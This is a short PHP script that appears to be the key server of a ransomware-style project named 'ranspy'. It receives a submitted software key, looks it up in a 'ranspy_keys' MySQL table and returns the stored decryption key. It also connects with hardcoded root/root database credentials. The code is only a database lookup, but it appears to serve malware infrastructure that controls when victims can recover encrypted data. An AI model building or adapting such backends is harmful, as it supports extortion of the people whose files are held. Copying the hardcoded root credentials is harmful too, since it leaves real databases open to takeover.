<?php

if (isset($_POST['software_key'])) {
	$software_key = htmlspecialchars($_POST['software_key']);
	$software_key_encoded = htmlspecialchars(base64_encode($_POST['software_key']));
	
	$servername = "localhost";
	$username = "root";
	$password = "root";
	$dbname = "ranspy";

	$conn = new mysqli($servername, $username, $password, $dbname);
	if ($conn->connect_error) {
		die("Connection failed: " . $conn->connect_error);
	} 
	
	$sql = sprintf("SELECT decrypt_key FROM ranspy_keys WHERE software_key='%s'", mysqli_real_escape_string($conn, $software_key_encoded));
	$result = $conn->query($sql);

	if ($result->num_rows > 0) {
		while($row = $result->fetch_assoc()) {
			echo base64_decode($row["decrypt_key"]);
		}
	} else {
		echo "Failed";
	}
	 $conn->close();
}
else {
	echo "Failed";
}


